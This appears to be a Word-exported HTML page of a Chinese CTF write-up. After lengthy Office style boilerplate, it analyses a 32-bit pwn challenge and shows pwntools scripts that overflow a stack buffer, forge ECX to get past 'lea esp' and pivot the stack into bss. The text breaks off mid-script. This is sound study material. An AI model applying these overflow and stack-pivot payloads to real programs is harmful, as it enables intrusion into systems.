<w:LsdException Locked="false"  Priority="61"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light List Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="62"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Grid Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="63"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 1 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="64"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 2 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="65"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 1 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="66"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 2 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="67"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 1 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="68"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 2 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="69"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 3 Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="70"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Dark List Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid Accent 4" ></w:LsdException>
<w:LsdException Locked="false"  Priority="60"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Shading Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="61"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light List Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="62"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Grid Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="63"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 1 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="64"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 2 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="65"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 1 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="66"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 2 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="67"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 1 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="68"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 2 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="69"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 3 Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="70"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Dark List Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid Accent 5" ></w:LsdException>
<w:LsdException Locked="false"  Priority="60"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Shading Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="61"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light List Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="62"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Light Grid Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="63"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 1 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="64"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Shading 2 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="65"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 1 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="66"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium List 2 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="67"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 1 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="68"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 2 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="69"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Medium Grid 3 Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="70"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Dark List Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="71"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Shading Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="72"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful List Accent 6" ></w:LsdException>
<w:LsdException Locked="false"  Priority="73"  SemiHidden="false"  UnhideWhenUsed="false"  Name="Colorful Grid Accent 6" ></w:LsdException>
</w:LatentStyles></xml><![endif]--><style>
@font-face{
font-family:"Times New Roman";
}

@font-face{
font-family:"宋体";
}

@font-face{
font-family:"Calibri";
}

@font-face{
font-family:"Wingdings";
}

@font-face{
font-family:"微软雅黑";
}

p.MsoNormal{
mso-style-name:正文;
mso-style-parent:"";
margin:0pt;
margin-bottom:.0001pt;
mso-pagination:none;
text-align:justify;
text-justify:inter-ideograph;
font-family:Calibri;
mso-fareast-font-family:宋体;
mso-bidi-font-family:'Times New Roman';
font-size:10.5000pt;
mso-font-kerning:1.0000pt;
}

span.10{
font-family:Calibri;
}

p.MsoHeader{
mso-style-name:页眉;
margin:0pt;
margin-bottom:.0001pt;
border-top:none;
mso-border-top-alt:none;
border-right:none;
mso-border-right-alt:none;
border-bottom:none;
mso-border-bottom-alt:none;
border-left:none;
mso-border-left-alt:none;
padding:1pt 4pt 1pt 4pt ;
layout-grid-mode:char;
mso-pagination:none;
text-align:justify;
text-justify:inter-ideograph;
font-family:Calibri;
mso-fareast-font-family:宋体;
mso-bidi-font-family:'Times New Roman';
font-size:9.0000pt;
mso-font-kerning:1.0000pt;
}

p.MsoFooter{
mso-style-name:页脚;
margin:0pt;
margin-bottom:.0001pt;
layout-grid-mode:char;
mso-pagination:none;
text-align:left;
font-family:Calibri;
mso-fareast-font-family:宋体;
mso-bidi-font-family:'Times New Roman';
font-size:9.0000pt;
mso-font-kerning:1.0000pt;
}

span.msoIns{
mso-style-type:export-only;
mso-style-name:"";
text-decoration:underline;
text-underline:single;
color:blue;
}

span.msoDel{
mso-style-type:export-only;
mso-style-name:"";
text-decoration:line-through;
color:red;
}

table.MsoNormalTable{
mso-style-name:普通表格;
mso-style-parent:"";
mso-style-noshow:yes;
mso-tstyle-rowband-size:0;
mso-tstyle-colband-size:0;
mso-padding-alt:0.0000pt 5.4000pt 0.0000pt 5.4000pt;
mso-para-margin:0pt;
mso-para-margin-bottom:.0001pt;
mso-pagination:widow-orphan;
font-family:'Times New Roman';
font-size:10.0000pt;
mso-ansi-language:#0400;
mso-fareast-language:#0400;
mso-bidi-language:#0400;
}
@page{mso-page-border-surround-header:no;
	mso-page-border-surround-footer:no;}@page Section0{
margin-top:72.0000pt;
margin-bottom:72.0000pt;
margin-left:90.0000pt;
margin-right:90.0000pt;
size:595.3000pt 841.9000pt;
layout-grid:15.6000pt;
}
div.Section0{page:Section0;}</style></head><body style="tab-interval:21pt;text-justify-trim:punctuation;" ><!--StartFragment--><div class="Section0"  style="layout-grid:15.6000pt;" ><p class=MsoNormal  align=center  style="text-align:center;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >绕过</font>lea esp和Ret2dl的一些补充</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=center  style="text-align:center;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >肖临风</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=center  style="text-align:center;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >指导老师</font>:乐德广</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=center  style="text-align:center;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >2019年5月</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=center  style="text-align:center;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >概述：</font>ISCC的第一道pwn题，同样是32位下的ret2dl的考察，正好给前几天的学习做一下复习巩固。也碰到了很多新的问题。因为是调试笔记，所以写的比较零散。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >目录</font>:</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >0x00程序分析</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >0x01 stack povit</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >0x02对Rel2dl的一些补充</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >0x03 纠错</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >0x00程序分析+一个历史遗留问题</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >放入</font>IDA，发现一个超级明显的栈溢出，而且还能输入超长的字符串。#这不是明显给我们构造ret2dl提供方便嘛，否则必须要写一段调用一下read，很麻烦。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="546"  height="215"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充277.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >但是观察一下反汇编，发现</font>ret的上一条命令是</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >lea &nbsp;&nbsp;&nbsp;esp,[ecx-0x4]</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >，</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >而不是</font>leave。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&nbsp;&nbsp;0x080484b1 &#60;</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >main</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >+91&#62;:</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >pop &nbsp;&nbsp;&nbsp;ecx</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&nbsp;&nbsp;0x080484b2 &#60;</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >main</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >+92&#62;:</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >pop &nbsp;&nbsp;&nbsp;ebx</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&nbsp;&nbsp;0x080484b3 &#60;</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >main</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >+93&#62;:</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >pop &nbsp;&nbsp;&nbsp;ebp</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&nbsp;&nbsp;0x80484b4 &#60;main+94&#62;:</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&#9;</span><b><span style="mso-spacerun:'yes';font-family:微软雅黑;font-weight:bold;
font-size:9.0000pt;mso-font-kerning:1.0000pt;" >lea &nbsp;&nbsp;&nbsp;esp,[ecx-0x4]</span></b><b><span style="mso-spacerun:'yes';font-family:微软雅黑;font-weight:bold;
font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></b></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >=&#62; 0x80484b7 &#60;main+97&#62;:</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >ret </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >根据之前的经验，这个程序应该是在</font>64位下编译的32位程序，大佬说这是i386的平栈方式。main函数的ret，一旦覆盖大量的数据，就会导致栈顶地址出错。所以之前我一直认为是无法溢出成功的。因为一旦溢出大量数据，也会修改ECX的值，导致ESP的值出问题。如下图所示。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#PS:lea esp,[ecx-0x4] 实际上就是将ecx-0x4的值赋给ESP</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="322"  height="261"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充689.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >ESP=ECX(0x41414141-0x4)=0x4141413d</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >其实既然</font>ECX对ret时的ESP能产生直接影响，那么通过控制ECX也能间接控制ESP</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >只需要找到</font>pop ecx 时候对应的栈顶，就能控制ECX。下面给出脚本。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >0x01 stack povit</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#伪造ecx，控制esp的流程</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >from pwn import *</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p=process('./pwn01')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gdb.attach(p,'b *0x80484b1')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload="A"*0xe</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(0xffffd060)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&nbsp;#控制ecx</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.interactive()</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >上面代码成功控制了</font>ecx，使得栈顶没有乱跑。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >但是因为栈空间的随机化，导致对</font>esp的控制没有了意义。#因为每次ret时候，栈顶的位置都不确定</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >所以必须要到一个地址可控的区域，第一个想到的就是</font>bss段。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >通过</font>find，发现buf的参数也是存放在bss段中。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="515"  height="170"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充1124.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >直接伪造</font>ecx，让栈指向到bss段中</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >from pwn import *</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p=process('./pwn01')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gdb.attach(p,'b *0x80484b1')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >Address=0x12345678</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_ecx=0x804a05a</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload="A"*0xe</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(fake_ecx)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="BBBB"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
